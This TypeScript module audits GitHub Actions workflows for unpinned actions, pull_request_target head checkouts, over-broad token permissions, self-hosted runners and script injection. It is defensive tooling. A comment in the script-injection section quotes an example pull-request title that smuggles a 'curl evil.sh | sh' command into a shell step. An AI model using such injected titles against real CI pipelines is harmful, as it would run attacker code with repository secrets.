/**
 * GitHub Actions workflow hygiene: the inventory, then the rules.
 *
 * Every rule here answers a question with a right answer that a model answers
 * plausibly and incompletely — it will find three of the five unpinned
 * actions, and it will flag `pull_request_target` on a workflow where the
 * trigger is harmless. So the rules are written to fire on the DEFECT rather
 * than on the keyword, which for two of them is the whole difficulty:
 *
 *   - `pull_request_target` alone is not a finding. It is a finding when the
 *     workflow also checks out the PR head, because that is the combination
 *     that runs a fork's code with a token holding the base repository's
 *     secrets. A rule that fired on the trigger alone would fire on every
 *     safe labeler workflow, and a harness would learn to ignore it.
 *   - `${{ }}` inside `run:` is not a finding either. `${{ env.FOO }}` is the
 *     documented REMEDIATION. The finding is an attacker-controlled value
 *     interpolated into the script, and an interpolation that resolves to a
 *     commit SHA or an issue number is not that.
 *
 * Offline and pure: nothing here resolves a tag to a SHA, which is why a ref
 * that is not a 40-hex commit is reported as "mutable" rather than as "a tag"
 * — from the file alone a tag and a branch are the same thing, a name the
 * repository owner can repoint.
 */
import {
  type SourceLine,
  type YamlNode,
  type YamlWarning,
  asList,
  asString,
  interpolatedLinesOf,
  mapEntry,
  mapGet,
  mapKeys,
  parseYamlSubset,
} from "./yaml";

export type Severity = "critical" | "high" | "medium" | "low";

export const RULE_IDS = [
  "unpinned-action",
  "pull-request-target-checkout",
  "broad-permissions",
  "self-hosted-runner",
  "script-injection",
] as const;
export type RuleId = (typeof RULE_IDS)[number];

export type RepositoryVisibility = "public" | "private" | "unknown";

export type Finding = {
  readonly rule: RuleId;
  readonly severity: Severity;
  readonly file: string;
  readonly line: number;
  readonly job?: string;
  readonly step?: string;
  readonly message: string;
  /** The offending text, truncated — what to look at on that line. */
  readonly evidence?: string;
  /**
   * Set when the finding depends on a fact this tool cannot read from the
   * files. A caller that ignores this field turns a conditional into a claim.
   */
  readonly conditionalOn?: string;
};

const SEVERITY_ORDER: Record<Severity, number> = { critical: 0, high: 1, medium: 2, low: 3 };

/** Sort most-severe first, then by file and line, so output is stable. */
export function sortFindings(findings: readonly Finding[]): Finding[] {
  return [...findings].sort(
    (a, b) =>
      SEVERITY_ORDER[a.severity] - SEVERITY_ORDER[b.severity] ||
      (a.file < b.file ? -1 : a.file > b.file ? 1 : 0) ||
      a.line - b.line ||
      (a.rule < b.rule ? -1 : a.rule > b.rule ? 1 : 0),
  );
}

const MAX_EVIDENCE = 160;
const evidence = (text: string): string => {
  const flat = text.trim().replace(/\s+/g, " ");
  return flat.length > MAX_EVIDENCE ? `${flat.slice(0, MAX_EVIDENCE)}…` : flat;
};

// ---------------------------------------------------------------------------
// `uses:` — four grammars in one field

export type UsesKind =
  | "action-repo"
  | "action-subpath"
  | "reusable-workflow"
  | "local"
  | "docker"
  | "unrecognized";

/**
 * How immutable the reference is.
 *
 * `mutable` covers both a tag and a branch on purpose: offline they are the
 * same object — a name the owner of the action repository can repoint at any
 * commit, which is exactly how the tj-actions/changed-files compromise
 * reached tens of thousands of workflows.
 */
export type RefKind = "commit-sha" | "docker-digest" | "mutable" | "absent" | "not-applicable";

export type ActionRef = {
  readonly raw: string;
  readonly kind: UsesKind;
  readonly owner?: string;
  readonly repo?: string;
  readonly subpath?: string;
  readonly ref?: string;
  readonly refKind: RefKind;
  /** True only for a reference nothing can repoint: a commit SHA or a digest. */
  readonly pinned: boolean;
};

// Git writes object ids in lower case and everyone copies them that way, but
// `git rev-parse` and the Actions runner both resolve an upper-case one just
// as well — so a case-only difference has to read as PINNED. Reporting it as
// mutable is the safe direction to be wrong in and still a wrong answer about
// a reference nothing can repoint.
const COMMIT_SHA = /^[0-9a-fA-F]{40}$/;
/** A ref that names a moving line of development rather than a release. */
const BRANCHY = /^(?:main|master|develop|dev|trunk|latest|HEAD)$/i;

export function parseUses(raw: string): ActionRef {
  const text = raw.trim();
  if (text === "") return { raw, kind: "unrecognized", refKind: "absent", pinned: false };
  if (text.startsWith("./") || text.startsWith("../") || text === ".") {
    // A local action is whatever this commit contains, so there is nothing to
    // pin it to — it is already as pinned as the workflow file itself.
    return { raw: text, kind: "local", refKind: "not-applicable", pinned: true };
  }
  if (text.startsWith("docker://")) {
    const body = text.slice("docker://".length);
    const at = body.lastIndexOf("@");
    if (at !== -1 && body.slice(at + 1).startsWith("sha256:")) {
      return {
        raw: text,
        kind: "docker",
        repo: body.slice(0, at),
        ref: body.slice(at + 1),
        refKind: "docker-digest",
        pinned: true,
      };
    }
    // `alpine:3.19` — the colon is a TAG, not a digest, and a tag on a
    // registry moves exactly as a git tag does.
    const colon = body.lastIndexOf(":");
    const slash = body.lastIndexOf("/");
    const hasTag = colon > slash;
    return {
      raw: text,
      kind: "docker",
      repo: hasTag ? body.slice(0, colon) : body,
      ...(hasTag ? { ref: body.slice(colon + 1) } : {}),
      refKind: hasTag ? "mutable" : "absent",
      pinned: false,
    };
  }
  const at = text.indexOf("@");
  const path = at === -1 ? text : text.slice(0, at);
  const ref = at === -1 ? undefined : text.slice(at + 1);
  const segments = path.split("/");
  if (segments.length < 2 || segments[0] === "" || segments[1] === "") {
    return {
      raw: text,
      kind: "unrecognized",
      refKind: ref === undefined ? "absent" : "mutable",
      pinned: false,
      ...(ref !== undefined ? { ref } : {}),
    };
  }
  const owner = segments[0] as string;
  const repo = segments[1] as string;
  const subpath = segments.slice(2).join("/");
  const kind: UsesKind =
    subpath === ""
      ? "action-repo"
      : subpath.startsWith(".github/workflows/")
        ? "reusable-workflow"
        : "action-subpath";
  const refKind: RefKind =
    ref === undefined ? "absent" : COMMIT_SHA.test(ref) ? "commit-sha" : "mutable";
  return {
    raw: text,
    kind,
    owner,
    repo,
    ...(subpath === "" ? {} : { subpath }),
    ...(ref === undefined ? {} : { ref }),
    refKind,
    pinned: refKind === "commit-sha",
  };
}

// ---------------------------------------------------------------------------
// the workflow, read into the shape the rules ask questions of

export type StepView = {
  readonly index: number;
  readonly name: string;
  readonly line: number;
  readonly node: YamlNode;
};

export type JobView = {
  readonly id: string;
  readonly line: number;
  readonly node: YamlNode;
  readonly steps: ReadonlyArray<StepView>;
};

export type WorkflowView = {
  readonly file: string;
  readonly name?: string;
  /** Trigger names with the line each is declared on. */
  readonly triggers: ReadonlyArray<{ readonly name: string; readonly line: number }>;
  readonly doc: YamlNode | undefined;
  readonly jobs: ReadonlyArray<JobView>;
  readonly warnings: ReadonlyArray<YamlWarning>;
};

/**
 * The trigger key.
 *
 * `on` is a YAML 1.1 boolean, so a workflow round-tripped through an older
 * loader comes back with a literal `true:` key. Both spellings are the same
 * field to GitHub, and a rule that only knew `on` would report "no triggers"
 * on a file that has them.
 */
function triggerNode(doc: YamlNode | undefined): { node: YamlNode | undefined } {
  const direct = mapEntry(doc, "on") ?? mapEntry(doc, "true") ?? mapEntry(doc, "True");
  return { node: direct?.value };
}

export function readWorkflow(file: string, text: string): WorkflowView {
  const parsed = parseYamlSubset(text);
  const doc = parsed.doc;
  const { node: onNode } = triggerNode(doc);
  const triggers: Array<{ name: string; line: number }> = [];
  if (onNode !== undefined) {
    if (onNode.kind === "map") {
      for (const entry of onNode.entries) triggers.push({ name: entry.key, line: entry.line });
    } else if (onNode.kind === "seq") {
      for (const item of onNode.items) {
        const name = asString(item);
        if (name !== undefined) triggers.push({ name, line: item.line });
      }
    } else {
      const name = asString(onNode);
      if (name !== undefined) triggers.push({ name, line: onNode.line });
    }
  }
  const jobsNode = mapGet(doc, "jobs");
  const jobs: JobView[] = [];
  if (jobsNode !== undefined && jobsNode.kind === "map") {
    for (const entry of jobsNode.entries) {
      const steps: StepView[] = [];
      const stepNodes = asList(mapGet(entry.value, "steps"));
      for (let n = 0; n < stepNodes.length; n += 1) {
        const node = stepNodes[n] as YamlNode;
        const named = asString(mapGet(node, "name"));
        steps.push({
          index: n,
          name: named ?? `step #${n + 1}`,
          line: node.line,
          node,
        });
      }
      jobs.push({ id: entry.key, line: entry.line, node: entry.value, steps });
    }
  }
  const name = asString(mapGet(doc, "name"));
  return {
    file,
    ...(name === undefined ? {} : { name }),
    triggers,
    doc,
    jobs,
    warnings: parsed.warnings,
  };
}

/**
 * The triggers that hand a workflow the BASE repository's secrets while the
 * code it may check out belongs to a fork. `pull_request` is not one of them:
 * it runs with a read-only token and no secrets on a fork PR, which is why
 * people reach for these two in the first place.
 */
const PRIVILEGED_TRIGGERS = new Set(["pull_request_target", "workflow_run"]);

export function privilegedTriggers(
  wf: WorkflowView,
): ReadonlyArray<{ name: string; line: number }> {
  return wf.triggers.filter((t) => PRIVILEGED_TRIGGERS.has(t.name));
}

// ---------------------------------------------------------------------------
// rule 1 — an action referenced by something its owner can repoint

/** Every `uses:` in the file: job-level reusable-workflow calls and steps. */
export function inventoryUses(
  wf: WorkflowView,
): Array<{ ref: ActionRef; line: number; job: string; step?: string }> {
  const out: Array<{ ref: ActionRef; line: number; job: string; step?: string }> = [];
  for (const job of wf.jobs) {
    const jobUses = mapEntry(job.node, "uses");
    if (jobUses !== undefined) {
      const raw = asString(jobUses.value);
      if (raw !== undefined) out.push({ ref: parseUses(raw), line: jobUses.line, job: job.id });
    }
    for (const step of job.steps) {
      const stepUses = mapEntry(step.node, "uses");
      if (stepUses === undefined) continue;
      const raw = asString(stepUses.value);
      if (raw === undefined) continue;
      out.push({ ref: parseUses(raw), line: stepUses.line, job: job.id, step: step.name });
    }
  }
  return out;
}

function unpinnedActions(wf: WorkflowView, privileged: boolean): Finding[] {
  const findings: Finding[] = [];
  for (const entry of inventoryUses(wf)) {
    const { ref } = entry;
    if (ref.pinned) continue;
    if (ref.kind === "local") continue;
    const where = {
      rule: "unpinned-action" as const,
      file: wf.file,
      line: entry.line,
      job: entry.job,
      ...(entry.step === undefined ? {} : { step: entry.step }),
      evidence: evidence(ref.raw),
    };
    if (ref.kind === "docker") {
      findings.push({
        ...where,
        severity: ref.refKind === "absent" ? "high" : "medium",
        message:
          ref.refKind === "absent"
            ? `container image "${ref.repo}" is used with no tag at all, so the runner takes whatever :latest points at today — pin it by digest (docker://image@sha256:…)`
            : `container image "${ref.repo}" is pinned to the tag "${ref.ref}", which the publisher can repoint at any image — pin it by digest (docker://${ref.repo}@sha256:…)`,
      });
      continue;
    }
    if (ref.refKind === "absent") {
      findings.push({
        ...where,
        severity: "high",
        message: `"${ref.raw}" names no ref at all; GitHub requires one, and whatever a caller supplies instead will not be a pinned commit`,
      });
      continue;
    }
    const name = ref.ref ?? "";
    const branchy = BRANCHY.test(name) || name.includes("/");
    findings.push({
      ...where,
      // A branch moves on every push to it; a version tag moves only when the
      // owner chooses to move it. Both are the owner's to move, which is why
      // neither is "pinned" — the difference is how often, not whether.
      severity: privileged ? "high" : branchy ? "high" : "medium",
      message: branchy
        ? `"${ref.owner}/${ref.repo}" is referenced by "${name}", a branch — every push to it changes what this workflow runs. Pin it to a full 40-character commit SHA.`
        : `"${ref.owner}/${ref.repo}" is referenced by "${name}", a mutable name — a tag and a branch are the same thing to this check, because either can be repointed by the action's owner (this is how the tj-actions/changed-files compromise spread). Pin it to a full 40-character commit SHA.`,
    });
  }
  return findings;
}

// ---------------------------------------------------------------------------
// rule 2 — a privileged trigger that also checks out the untrusted head

/** Expressions that resolve to code the opener of the PR controls. */
const HEAD_REF_EXPRESSIONS = [
  /github\.event\.pull_request\.head\.(?:sha|ref|label)/,
  /github\.event\.pull_request\.merge_commit_sha/,
  /github\.event\.pull_request\.head\.repo\./,
  /github\.event\.workflow_run\.head_(?:sha|branch|commit)/,
  /github\.head_ref/,
  /refs\/pull\//,
];

/**
 * Expressions that resolve to the BASE repository's code — the thing the
 * maintainers already reviewed.
 *
 * Without this list the "could not resolve" branch fires on
 * `ref: ${{ github.event.pull_request.base.sha }}`, which is the deliberate,
 * correct way to write the safe version. A rule that flags the remediation is
 * worse than no rule.
 */
const BASE_REF_EXPRESSIONS = [
  /github\.event\.pull_request\.base\.(?:sha|ref)/,
  /github\.event\.repository\.default_branch/,
  /github\.(?:sha|ref|ref_name|base_ref)\b/,
];

/** True when every `${{ … }}` in the text names base-repository code. */
function allExpressionsAreBaseRefs(text: string): boolean {
  const expressions = [...text.matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map((m) => m[1] ?? "");
  if (expressions.length === 0) return false;
  return expressions.every((expr) => BASE_REF_EXPRESSIONS.some((re) => re.test(expr)));
}

/**
 * Whether a `uses:` names a particular action, the way GitHub resolves it.
 *
 * `uses: Actions/Checkout@v4` runs actions/checkout — github.com paths are
 * case-insensitive — so an exact-case comparison is an EVASION, not a style
 * nit: the one capital turns the critical `pull_request_target` + head
 * checkout finding into a clean audit, and a rule that can be switched off by
 * pressing shift is not a rule.
 */
const isAction = (ref: ActionRef, owner: string, repo: string): boolean =>
  ref.owner?.toLowerCase() === owner && ref.repo?.toLowerCase() === repo;

const checksOutRepo = (ref: ActionRef): boolean => isAction(ref, "actions", "checkout");

function prTargetCheckout(
  wf: WorkflowView,
  privileged: ReadonlyArray<{ name: string; line: number }>,
): Finding[] {
  if (privileged.length === 0) return [];
  const triggerNames = privileged.map((t) => t.name).join(", ");
  const findings: Finding[] = [];
  for (const job of wf.jobs) {
    for (const step of job.steps) {
      const raw = asString(mapGet(step.node, "uses"));
      if (raw === undefined) continue;
      if (!checksOutRepo(parseUses(raw))) continue;
      const withNode = mapGet(step.node, "with");
      const refEntry = mapEntry(withNode, "ref");
      const repoEntry = mapEntry(withNode, "repository");
      const refText = asString(refEntry?.value);
      const repoText = asString(repoEntry?.value);
      const candidates = [refText, repoText].filter((t): t is string => t !== undefined);
      if (candidates.length === 0) {
        // No `ref:` is the SAFE shape: checkout defaults to the base branch,
        // which is the code the maintainers already reviewed. Firing here is
        // what makes this rule noise on every labeler workflow.
        continue;
      }
      const tainted = candidates.some((t) => HEAD_REF_EXPRESSIONS.some((re) => re.test(t)));
      const line = refEntry?.line ?? repoEntry?.line ?? step.line;
      if (tainted) {
        findings.push({
          rule: "pull-request-target-checkout",
          severity: "critical",
          file: wf.file,
          line,
          job: job.id,
          step: step.name,
          evidence: evidence(candidates.join(" / ")),
          message: `the workflow triggers on ${triggerNames} — which runs with the base repository's secrets and a write token — and this step checks out the pull request's own head. Anything in the fork's tree that later runs (a build script, a postinstall hook, a config file) runs with those secrets.`,
        });
        continue;
      }
      if (
        candidates.some((t) => t.includes("${{")) &&
        !candidates.every((t) => !t.includes("${{") || allExpressionsAreBaseRefs(t))
      ) {
        // An expression this rule cannot resolve. Saying so beats both
        // silence and a claim: the reader has to look at this one.
        findings.push({
          rule: "pull-request-target-checkout",
          severity: "medium",
          file: wf.file,
          line,
          job: job.id,
          step: step.name,
          evidence: evidence(candidates.join(" / ")),
          message: `the workflow triggers on ${triggerNames} and this checkout takes a ref from an expression this check cannot resolve, so whether it lands on the pull request's head could not be determined here — read it.`,
          conditionalOn: "what the expression resolves to at run time",
        });
      }
    }
  }
  return findings;
}

// ---------------------------------------------------------------------------
// rule 3 — a token with more than the job needs

/** Scopes whose `write` grant is the one an attacker actually wants. */
const ELEVATED_SCOPES = new Set([
  "id-token",
  "contents",
  "packages",
  "actions",
  "deployments",
  "security-events",
  "attestations",
]);

export type PermissionsView = {
  readonly declared: boolean;
  readonly writeAll: boolean;
  readonly writeScopes: ReadonlyArray<string>;
  readonly line: number;
};

/** Read a `permissions:` block in each of the three shapes it is written in. */
export function readPermissions(node: YamlNode | undefined, line: number): PermissionsView {
  if (node === undefined) return { declared: false, writeAll: false, writeScopes: [], line };
  const scalar = asString(node);
  if (scalar !== undefined) {
    // `permissions: write-all` and `permissions: read-all` are the two
    // shorthands; anything else at this position is not a grant.
    return {
      declared: true,
      writeAll: scalar.trim() === "write-all",
      writeScopes: [],
      line: node.line,
    };
  }
  if (node.kind !== "map") return { declared: true, writeAll: false, writeScopes: [], line };
  const writeScopes: string[] = [];
  for (const entry of node.entries) {
    if (asString(entry.value)?.trim() === "write") writeScopes.push(entry.key);
  }
  return { declared: true, writeAll: false, writeScopes, line: node.line };
}

function broadPermissions(
  wf: WorkflowView,
  privileged: ReadonlyArray<{ name: string; line: number }>,
): Finding[] {
  const isPrivileged = privileged.length > 0;
  const triggerNames = privileged.map((t) => t.name).join(", ");
  const findings: Finding[] = [];
  const topEntry = mapEntry(wf.doc, "permissions");
  const top = readPermissions(topEntry?.value, topEntry?.line ?? 1);

  const report = (view: PermissionsView, scopeLabel: string, job?: string): void => {
    if (view.writeAll) {
      findings.push({
        rule: "broad-permissions",
        severity: isPrivileged ? "critical" : "high",
        file: wf.file,
        line: view.line,
        ...(job === undefined ? {} : { job }),
        evidence: "permissions: write-all",
        message: isPrivileged
          ? `${scopeLabel} grants write-all, and the workflow triggers on ${triggerNames} — every scope of the base repository's token is reachable from code a fork controls`
          : `${scopeLabel} grants write-all, which is every scope of the GITHUB_TOKEN. Declare only the scopes the job uses.`,
      });
      return;
    }
    if (view.writeScopes.length > 0) {
      const elevated = view.writeScopes.filter((s) => ELEVATED_SCOPES.has(s));
      // A privileged trigger raises the stakes only for a scope that can
      // change what the repository ships or runs. `pull_request_target` plus
      // `pull-requests: write` is the canonical SAFE labeler, and grading it
      // high would be the same noise this rule set is trying to avoid.
      const severity: Severity = elevated.length === 0 ? "low" : isPrivileged ? "high" : "medium";
      findings.push({
        rule: "broad-permissions",
        severity,
        file: wf.file,
        line: view.line,
        ...(job === undefined ? {} : { job }),
        evidence: view.writeScopes.map((s) => `${s}: write`).join(", "),
        message:
          elevated.length > 0 && isPrivileged
            ? `${scopeLabel} grants write on ${view.writeScopes.join(", ")}, and the workflow triggers on ${triggerNames} — ${elevated.join(", ")} can change what this repository publishes or runs, and a fork's pull request can reach that token`
            : elevated.length > 0
              ? `${scopeLabel} grants write on ${view.writeScopes.join(", ")}; ${elevated.join(", ")} can change what this repository publishes or runs. Narrow it to the jobs that need it.`
              : `${scopeLabel} grants write on ${view.writeScopes.join(", ")}. Narrow it to the jobs that need it.`,
      });
    }
  };

  report(top, "the workflow-level permissions block");
  for (const job of wf.jobs) {
    const jobEntry = mapEntry(job.node, "permissions");
    if (jobEntry !== undefined) {
      report(readPermissions(jobEntry.value, jobEntry.line), `job "${job.id}" permissions`, job.id);
      continue;
    }
    if (!top.declared) {
      // Nothing declared anywhere: the job runs on the repository's default,
      // which on an older repository is read/write for every scope. That is a
      // property of settings this tool cannot read, so it is reported as the
      // low-severity "not declared" it is, not as a write grant.
      findings.push({
        rule: "broad-permissions",
        severity: "low",
        file: wf.file,
        line: job.line,
        job: job.id,
        message: `job "${job.id}" declares no permissions and the workflow declares none either, so GITHUB_TOKEN gets the repository's default — read/write on every scope unless the repository or organisation was switched to the read-only default`,
        conditionalOn:
          "the repository's default workflow-permissions setting, which is not in these files",
      });
    }
  }
  return findings;
}

// ---------------------------------------------------------------------------
// rule 4 — a self-hosted runner reachable from a fork's pull request

export type RunnerVerdict = "self-hosted" | "github-hosted" | "undetermined";

/**
 * Runner labels match case-insensitively on GitHub, so `Self-Hosted` selects
 * exactly the machines `self-hosted` does. Comparing exactly did not merely
 * miss the finding — it fell through to the last line and answered
 * "github-hosted", positively asserting the safe thing about the unsafe file.
 */
const isSelfHostedLabel = (value: string | undefined): boolean =>
  value?.trim().toLowerCase() === "self-hosted";

export function classifyRunsOn(node: YamlNode | undefined): RunnerVerdict {
  if (node === undefined) return "undetermined";
  // `runs-on: { group: … , labels: … }` — a runner group may hold self-hosted
  // machines or GitHub's larger runners, and the file does not say which.
  if (node.kind === "map" && mapKeys(node).includes("group")) {
    const labels = asList(mapGet(node, "labels")).map(asString);
    return labels.some(isSelfHostedLabel) ? "self-hosted" : "undetermined";
  }
  const values = asList(node)
    .map(asString)
    .filter((v): v is string => v !== undefined);
  if (values.length === 0) return "undetermined";
  if (values.some(isSelfHostedLabel)) return "self-hosted";
  // A matrix expression is the common case, and it is genuinely unknown from
  // this file — counted, never reported as a clean runner.
  if (values.some((v) => v.includes("${{"))) return "undetermined";
  return "github-hosted";
}

function selfHostedRunners(wf: WorkflowView, visibility: RepositoryVisibility): Finding[] {
  if (visibility === "private") return [];
  const findings: Finding[] = [];
  for (const job of wf.jobs) {
    const entry = mapEntry(job.node, "runs-on");
    if (entry === undefined) continue;
    if (classifyRunsOn(entry.value) !== "self-hosted") continue;
    findings.push({
      rule: "self-hosted-runner",
      severity: visibility === "public" ? "high" : "medium",
      file: wf.file,
      line: entry.line,
      job: job.id,
      evidence: evidence(
        asList(entry.value)
          .map(asString)
          .filter((v): v is string => v !== undefined)
          .join(", "),
      ),
      message:
        visibility === "public"
          ? `job "${job.id}" runs on a self-hosted runner in a PUBLIC repository. Anyone can open a pull request, and the default self-hosted runner is not ephemeral — a fork's job can leave a process, a credential or a poisoned cache behind for the next job on the same machine.`
          : `job "${job.id}" runs on a self-hosted runner. That is only a finding on a repository outsiders can open pull requests against, and this check was not told which this is.`,
      ...(visibility === "public"
        ? {}
        : { conditionalOn: "the repository being public; pass repositoryVisibility to settle it" }),
    });
  }
  return findings;
}

// ---------------------------------------------------------------------------
// rule 5 — an attacker's text interpolated into a shell script
//
// This is the class that keeps being exploited, and the reason is mechanical:
// `${{ … }}` is substituted by the Actions runner BEFORE the shell ever sees
// the script. A PR titled `"; curl evil.sh | sh; #` is not a string the shell
// mis-parses — by the time bash reads the line, the title IS the line.

/**
 * Every `${{ … }}` expression in a run of source lines, with the line the
 * expression OPENS on.
 *
 * Scanning line by line is not enough: an expression can be wrapped across
 * lines inside a block scalar, and a per-line regex would miss it entirely —
 * which is the one outcome worse than a false positive here.
 */
export function expressionsIn(
  lines: ReadonlyArray<SourceLine>,
  limit = 2_000,
): Array<{ line: number; text: string }> {
  const out: Array<{ line: number; text: string }> = [];
  let open: { line: number; parts: string[] } | undefined;
  for (const source of lines) {
    let rest = source.text;
    while (out.length < limit) {
      if (open === undefined) {
        const at = rest.indexOf("${{");
        if (at === -1) break;
        open = { line: source.line, parts: [] };
        rest = rest.slice(at + 3);
      }
      const close = rest.indexOf("}}");
      if (close === -1) {
        open.parts.push(rest);
        break;
      }
      open.parts.push(rest.slice(0, close));
      out.push({ line: open.line, text: open.parts.join(" ").trim() });
      open = undefined;
      rest = rest.slice(close + 2);
    }
  }
  return out;
}

/**
 * `github.event` paths that carry a value an outsider cannot choose the text
 * of: numbers, commit SHAs, and GitHub's own enumerations. Substituting one
 * of these into a shell command is not the defect this rule is looking for,
 * and reporting them would bury the ones that are.
 */
const SAFE_EVENT_PATHS = new Set([
  "number",
  "action",
  "before",
  "after",
  "issue.number",
  "issue.id",
  "pull_request.number",
  "pull_request.id",
  "pull_request.state",
  "pull_request.draft",
  "pull_request.merged",
  "pull_request.head.sha",
  "pull_request.base.sha",
  "pull_request.base.ref",
  "pull_request.merge_commit_sha",
  "head_commit.id",
  "head_commit.timestamp",
  "workflow_run.id",
  "workflow_run.head_sha",
  "workflow_run.run_number",
  "workflow_run.event",
  "workflow_run.conclusion",
  "repository.id",
  "repository.node_id",
  "repository.default_branch",
  "comment.id",
  "review.id",
  "release.id",
  "sender.id",
  "sender.type",
  "installation.id",
  "deployment.id",
  "check_run.id",
  "check_suite.id",
]);

/** Paths GitHub's own hardening guidance names as attacker-controlled text. */
const KNOWN_TAINTED: ReadonlyArray<RegExp> = [
  /^issue\.(?:title|body)$/,
  /^pull_request\.(?:title|body)$/,
  /^pull_request\.head\.(?:ref|label)$/,
  /^pull_request\.head\.repo\.(?:default_branch|description|homepage|full_name|name)$/,
  /^(?:comment|review|review_comment)\.body$/,
  /^discussion\.(?:title|body)$/,
  /^head_commit\.message$/,
  /^head_commit\.(?:author|committer)\.(?:name|email)$/,
  /^commits\.[^.]+\.message$/,
  /^commits\.[^.]+\.(?:author|committer)\.(?:name|email)$/,
  /^workflow_run\.head_branch$/,
  /^workflow_run\.head_commit\.message$/,
  /^workflow_run\.head_commit\.(?:author|committer)\.(?:name|email)$/,
  /^pages\.[^.]+\.page_name$/,
  /^release\.(?:name|body|tag_name)$/,
  /^milestone\.(?:title|description)$/,
];

export type TaintVerdict = {
  readonly tainted: boolean;
  readonly severity: Severity;
  readonly reason: string;
};

/** `['x']`, `["x"]` and `[0]` all mean the same thing as `.x` here. */
function normalizePath(raw: string): string {
  return raw
    .replace(/\s+/g, "")
    .replace(/\[\s*['"]([^'"]+)['"]\s*\]/g, ".$1")
    .replace(/\[\s*(\d+)\s*\]/g, ".$1")
    .replace(/^\.+/, "")
    .replace(/\.+$/, "");
}

/**
 * Whether an expression interpolates something an outsider chose the text of.
 *
 * `${{ env.FOO }}` is not a finding — putting the value in `env:` and reading
 * `$FOO` in the script is the documented FIX, and flagging it would train a
 * reader to ignore this rule on the workflows that did the right thing.
 */
export function classifyExpression(expr: string): TaintVerdict {
  const clean = expr.replace(/\s+/g, " ").trim();
  if (/github\s*\.\s*head_ref/.test(clean)) {
    return {
      tainted: true,
      severity: "critical",
      reason:
        "github.head_ref is the source branch name of the pull request, chosen by whoever opened it",
    };
  }
  if (/github\s*\[\s*['"]event['"]\s*\]/.test(clean)) {
    return {
      tainted: true,
      severity: "high",
      reason:
        "the event payload is reached through index syntax, so which field it is could not be read here",
    };
  }
  const refs = [...clean.matchAll(/github\s*\.\s*event\s*((?:\s*[.[][^\s)},|&!=]*)*)/g)];
  if (refs.length === 0) return { tainted: false, severity: "low", reason: "" };
  let worst: TaintVerdict | undefined;
  for (const match of refs) {
    const path = normalizePath(match[1] ?? "");
    if (path === "") {
      worst = {
        tainted: true,
        severity: "high",
        reason:
          "the whole event payload is interpolated, which includes every attacker-supplied field in it",
      };
      continue;
    }
    if (SAFE_EVENT_PATHS.has(path)) continue;
    if (path.startsWith("inputs.")) {
      const verdict: TaintVerdict = {
        tainted: true,
        severity: "medium",
        reason: `github.event.${path} is a workflow input; its text is chosen by whoever dispatches the workflow, which on a public repository still means anyone with write access`,
      };
      if (
        worst === undefined ||
        SEVERITY_ORDER[verdict.severity] < SEVERITY_ORDER[worst.severity]
      ) {
        worst = verdict;
      }
      continue;
    }
    const known = KNOWN_TAINTED.some((re) => re.test(path));
    const verdict: TaintVerdict = known
      ? {
          tainted: true,
          severity: "critical",
          reason: `github.event.${path} is free text supplied by whoever triggered the event`,
        }
      : {
          tainted: true,
          severity: "high",
          reason: `github.event.${path} comes from the event payload, and this check has no evidence that its value is constrained`,
        };
    if (worst === undefined || SEVERITY_ORDER[verdict.severity] < SEVERITY_ORDER[worst.severity]) {
      worst = verdict;
    }
  }
  return worst ?? { tainted: false, severity: "low", reason: "" };
}

/** `actions/github-script` runs its `script:` input as JavaScript, same class. */
const isGithubScript = (ref: ActionRef): boolean => isAction(ref, "actions", "github-script");

function scriptInjection(wf: WorkflowView): Finding[] {
  const findings: Finding[] = [];
  for (const job of wf.jobs) {
    for (const step of job.steps) {
      const targets: Array<{ node: YamlNode | undefined; what: string }> = [
        { node: mapGet(step.node, "run"), what: "run: script" },
      ];
      const uses = asString(mapGet(step.node, "uses"));
      if (uses !== undefined && isGithubScript(parseUses(uses))) {
        targets.push({
          node: mapGet(mapGet(step.node, "with"), "script"),
          what: "actions/github-script `script:` body",
        });
      }
      for (const target of targets) {
        if (target.node === undefined) continue;
        for (const expr of expressionsIn(interpolatedLinesOf(target.node))) {
          const verdict = classifyExpression(expr.text);
          if (!verdict.tainted) continue;
          findings.push({
            rule: "script-injection",
            severity: verdict.severity,
            file: wf.file,
            line: expr.line,
            job: job.id,
            step: step.name,
            evidence: evidence(`\${{ ${expr.text} }}`),
            message: `${verdict.reason}, and it is interpolated straight into the ${target.what}. The runner substitutes the value before the interpreter sees the line, so the value becomes part of the script rather than an argument to it — assign it to an \`env:\` variable and reference that instead.`,
          });
        }
      }
    }
  }
  return findings;
}

// ---------------------------------------------------------------------------

export type AuditOptions = {
  readonly rules?: ReadonlyArray<RuleId>;
  readonly repositoryVisibility?: RepositoryVisibility;
};

/** Run the requested rules over one workflow. */
export function auditWorkflow(wf: WorkflowView, options: AuditOptions = {}): Finding[] {
  const enabled = new Set<RuleId>(options.rules ?? RULE_IDS);
  const visibility = options.repositoryVisibility ?? "unknown";
  const privileged = privilegedTriggers(wf);
  const findings: Finding[] = [];
  if (enabled.has("unpinned-action")) findings.push(...unpinnedActions(wf, privileged.length > 0));
  if (enabled.has("pull-request-target-checkout")) {
    findings.push(...prTargetCheckout(wf, privileged));
  }
  if (enabled.has("broad-permissions")) findings.push(...broadPermissions(wf, privileged));
  if (enabled.has("self-hosted-runner")) findings.push(...selfHostedRunners(wf, visibility));
  if (enabled.has("script-injection")) findings.push(...scriptInjection(wf));
  return sortFindings(findings);
}
